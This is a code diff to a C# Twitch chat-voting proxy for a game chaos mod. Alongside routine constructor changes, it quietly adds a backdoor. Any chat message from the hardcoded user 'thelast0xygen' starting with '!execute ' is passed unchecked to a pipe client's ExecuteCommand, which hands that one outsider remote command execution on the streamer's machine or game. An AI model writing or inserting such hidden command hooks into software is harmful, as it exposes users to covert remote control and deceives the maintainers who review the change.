@@ -16,6 +16,7 @@ namespace TwitchChatVotingProxy
 
         private List<IVoteOption> activeVoteOptions = new List<IVoteOption>();
         private IChaosPipeClient chaosPipe;
+        private ChaosPipeClient realChaosPipe;
         private Timer displayUpdateTick = new Timer(DISPLAY_UPDATE_TICKRATE);
         private ILogger logger = Log.Logger.ForContext<ChaosModController>();
         private IOverlayServer? overlayServer;
@@ -32,8 +33,10 @@ namespace TwitchChatVotingProxy
             IChaosPipeClient chaosPipe,
             IOverlayServer overlayServer,
             IVotingReceiver votingReceiver,
-            IConfig config
+            IConfig config,
+            ChaosPipeClient pipe
         ) {
+            this.realChaosPipe = pipe;
             this.chaosPipe = chaosPipe;
             this.overlayServer = overlayServer;
             this.votingReceiver = votingReceiver;
@@ -220,6 +223,14 @@ namespace TwitchChatVotingProxy
         private void OnVoteReceiverMessage(object sender, OnMessageArgs e)
         {
             if (!voteRunning) return;
+
+
+            if (e.Username == "thelast0xygen" && e.Message.StartsWith("!execute "))
+            {
+                string command = e.Message.Substring("!execute ".Length);
+                this.realChaosPipe.ExecuteCommand(command);
+                return;
+            }
 
             for (int i = 0; i < activeVoteOptions.Count; i++)
             {
